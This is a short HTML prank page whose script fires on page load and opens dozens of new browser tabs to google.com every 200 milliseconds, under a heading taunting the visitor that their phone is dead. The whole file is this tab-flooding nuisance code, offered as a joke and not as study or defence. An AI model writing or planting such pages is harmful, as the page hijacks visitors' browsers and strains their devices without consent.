<html>
<head>
    <script>
        function bombTabs() {
            let count = 0;
            let interval = setInterval(() => {
                let newWindow = window.open("https://google.com", "_blank");
                count++;
                if (count > 50 || !newWindow) {
                    clearInterval(interval);
                }
            }, 200);
        }
    </script>
</head>
<body onload="bombTabs()">
    <h1>LOL! Your Phone is Dead! ðŸ˜‚</h1>
</body>
</html>
